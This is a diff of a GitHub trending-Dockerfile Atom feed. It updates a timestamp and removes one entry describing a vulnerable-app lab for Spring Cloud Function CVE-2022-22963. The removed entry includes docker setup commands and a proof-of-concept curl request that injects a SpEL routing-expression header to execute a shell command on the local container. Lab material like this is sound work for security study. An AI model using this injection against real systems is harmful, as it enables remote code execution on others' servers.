@@ -1,14 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
   <title>GitHub Dockerfile Daily Trending</title>
   <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
-  <updated>2023-03-15T01:34:09Z</updated>
+  <updated>2023-03-16T01:32:34Z</updated>
   <subtitle>Daily Trending of Dockerfile in GitHub</subtitle>
   <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
-  <entry>
-    <title>me2nuk/CVE-2022-22963</title>
-    <updated>2023-03-15T01:34:09Z</updated>
-    <id>tag:github.com,2023-03-15:/me2nuk/CVE-2022-22963</id>
-    <link href="https://github.com/me2nuk/CVE-2022-22963" rel="alternate"></link>
-    <summary type="html">&lt;p&gt;Spring Cloud Function Vulnerable Application / CVE-2022-22963&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Spring Cloud Function Vulnerability(CVE-2022-22963)&lt;/h1&gt; &#xA;&lt;p&gt;Vulnerable Application to &lt;a href=&#34;https://tanzu.vmware.com/security/cve-2022-22963&#34;&gt;CVE-2022-22963&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;CVE-2022-22963 Exploit Demo&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://user-images.githubusercontent.com/57348147/161266562-51d025f0-54d4-488f-ac50-2317e29bfbdf.mp4&#34;&gt;https://user-images.githubusercontent.com/57348147/161266562-51d025f0-54d4-488f-ac50-2317e29bfbdf.mp4&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Build&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;docker pull me2nuk/cves:2022-22963&#xA;docker run -it -p 8080:8080 --name=vuln me2nuk/cves:2022-22963&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;POC&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl -X POST  http://0.0.0.0:8080/functionRouter -H &#39;spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(&#34;touch /tmp/pwned&#34;)&#39; --data-raw &#39;data&#39; -v&#xA;docker exec -it --user=root vuln ls /tmp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Reference&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://tanzu.vmware.com/security/cve-2022-22963&#34;&gt;https://tanzu.vmware.com/security/cve-2022-22963&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/hktalent/spring-spel-0day-poc/raw/main/README.md&#34;&gt;https://github.com/hktalent/spring-spel-0day-poc/blob/main/README.md&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/spring-cloud/spring-cloud-function&#34;&gt;https://github.com/spring-cloud/spring-cloud-function&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/&#34;&gt;https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
-  </entry>
 </feed>
